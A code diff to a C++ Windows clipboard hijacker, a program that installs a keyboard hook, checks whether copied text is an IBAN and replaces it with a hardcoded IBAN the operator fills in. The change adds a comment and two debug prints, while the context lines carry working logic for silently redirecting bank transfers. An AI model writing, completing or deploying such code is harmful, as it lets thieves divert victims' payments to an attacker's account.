@@ -11,6 +11,9 @@
 HHOOK keyboardHook;
 std::string IBAN = "BE0000000000000000"; // your IBAN TO SETUP;
 
+/**
+ * Doing a simple check on copied value determinating if it match with an IBAN.
+ */
 BOOL isIbanValue(char* ptrClipboardText){
     if(ptrClipboardText == nullptr || *ptrClipboardText == '\0')
     {
@@ -62,6 +65,7 @@ LRESULT CALLBACK clipper(int nCode, WPARAM wParam, LPARAM lParam) {
                 char* pClipboardText = static_cast<char*>(GlobalLock(hClipboardData));
                 if (pClipboardText != nullptr && isIbanValue(pClipboardText)) 
                 {
+                    std::cout << "[*] COPIED TEXT : " << pClipboardText << std::endl;
                     std::string newText = IBAN; // New clipboard content
                     GlobalUnlock(hClipboardData);
                     
@@ -79,6 +83,7 @@ LRESULT CALLBACK clipper(int nCode, WPARAM wParam, LPARAM lParam) {
                     }
                 }
             }
+            std::cout << "[*] CHANGED TEXT : " << IBAN << std::endl;
             CloseClipboard();
         }
     }
